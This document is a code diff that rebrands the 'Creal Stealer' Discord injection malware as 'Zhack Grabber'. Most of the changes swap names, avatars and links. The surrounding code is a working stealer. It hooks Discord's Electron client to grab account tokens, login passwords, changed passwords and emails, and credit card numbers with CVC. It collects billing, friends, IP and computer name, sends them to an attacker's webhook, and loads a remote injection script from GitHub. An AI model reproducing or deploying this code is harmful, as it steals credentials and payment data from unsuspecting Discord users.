@@ -17,7 +17,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 2895667,
 
-    creator: "Ayhu",
+    creator: "Zhack",
     transfer_link: `%TRANSFER_URL%`,
     injection_url: "https://raw.githubusercontent.com/ByteSleuths/Injection/main/inj.js",
     webhook: "%WEBHOOK%",
@@ -68,8 +68,8 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Creal Stealer",
-        avatar_url: "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
+        username: "Zhack Grabber",
+        avatar_url: "https://raw.githubusercontent.com/ByteSleuths/Img/main/Img/aaaaaaaaaaaa.png",
         content: "",
         embeds: [{
             title: title,
@@ -77,11 +77,11 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: `Creal Stealer`
+                name: `Zhack Grabber`
             },
             
             footer: {
-                text: `�[${config.creator}] | https://github.com/Ayhuuu/`
+                text: `�[${config.creator}] | https://github.com/ByteSleuths/`
             },
 
         }]
@@ -288,9 +288,9 @@ const post = async (params) => {
 const FirstTime = async () => {
     var token = await execScript(tokenScript)
     if (config['init-notify'] !== "true") return true
-    if (fs.existsSync(__dirname + "/Creal")){
+    if (fs.existsSync(__dirname + "/Zhack")){
         try{
-        fs.rmdirSync(__dirname + "/Creal")
+        fs.rmdirSync(__dirname + "/Zhack")
         }catch(err){
             console.log(err)
         }
@@ -302,7 +302,7 @@ const FirstTime = async () => {
     var client_discord = appName
     if (!token) {
         var params = await makeEmbed({
-            title: "Creal Stealer Initialized",
+            title: "Zhack Grabber Initialized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
@@ -317,13 +317,13 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
+        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ByteSleuths/Img/main/Img/aaaaaaaaaaaa.png"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ByteSleuths/Injection/main/banner.gif"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: " Creal Stealer Initialized",
+            title: " Zhack Grabber Initialized",
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
             fields: [{
                 name: "Username <:username:1041634536733290596> ",
@@ -355,10 +355,10 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                value: `[Zhack Grabber <a:mavikirmizi:853238372591599617>]`,
                 inline: !0
             }, {
-                name: "Creal Files",
+                name: "Zhack Files",
                 value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                 inline: !0
             }, {
@@ -395,7 +395,7 @@ const FirstTime = async () => {
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
-                title: "Creal User log out (User not Logged in before)",
+                title: "Zhack User log out (User not Logged in before)",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
@@ -410,13 +410,13 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ByteSleuths/Img/main/Img/aaaaaaaaaaaa.png"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ByteSleuths/Injection/main/banner.gif"
             
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "Creal Stealer Victim got logged out",
+                title: "Zhack Grabber Victim got logged out",
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
                     name: "Username <:username:1041634536733290596> ",
@@ -448,10 +448,10 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Creal Stealer  <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                    value: `[Zhack Grabber  <a:mavikirmizi:853238372591599617>]`,
                     inline: !0
                 }, {
-                    name: "Creal Files",
+                    name: "Zhack Grabber Files",
                     value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                     inline: !0
                 }, {
@@ -584,8 +584,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
+    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ByteSleuths/Img/main/Img/aaaaaaaaaaaa.png"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ByteSleuths/Injection/main/banner.gif"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -601,7 +601,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "Creal Stealer User Login",
+                title: "Zhack Grabber User Login",
                 color: config['embed-color'],
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
@@ -634,10 +634,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                    value: `[Zhack Grabber <a:mavikirmizi:853238372591599617>](https://github.com/ByteSleuths)`,
                     inline: !0
                 }, {
-                    name: "Creal Files",
+                    name: "Zhack Files",
                     value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                     inline: !0
                 }, {
@@ -686,7 +686,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "Creal Stealer Detect Password Changed",
+                    title: "Zhack Grabber Detect Password Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -719,10 +719,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                        value: `[Zhack Grabber <a:mavikirmizi:853238372591599617>](https://github.com/ByteSleuths)`,
                         inline: !0
                     }, {
-                        name: "Creal Files",
+                        name: "Zhack Files",
                         value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                         inline: !0
                     }, {
@@ -773,7 +773,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "Creal Stealer Detect Email Changed",
+                    title: "Zhack Grabber Detect Email Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -806,10 +806,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                        value: `[Zhack Grabber <a:mavikirmizi:853238372591599617>]`,
                         inline: !0
                     }, {
-                        name: "Creal Files",
+                        name: "Zhack Files",
                         value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                         inline: !0
                     }, {
@@ -859,10 +859,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
     
                 var params = await makeEmbed({
-                    title: "Creal Stealer User Credit Card Added",
+                    title: "Zhack Stealer User Credit Card Added",
                     color: config['embed-color'],
                     fields: [
-                      { name: "Creal Files", value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})` },
+                      { name: "Zhack Files", value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})` },
                       { name: "IP", value: ip },
                       { name: "Username <:username:1041634536733290596>", value: `${user.username}#${user.discriminator}` },
                       { name: "ID <:iduser:1041634535395307520>", value: user.id },
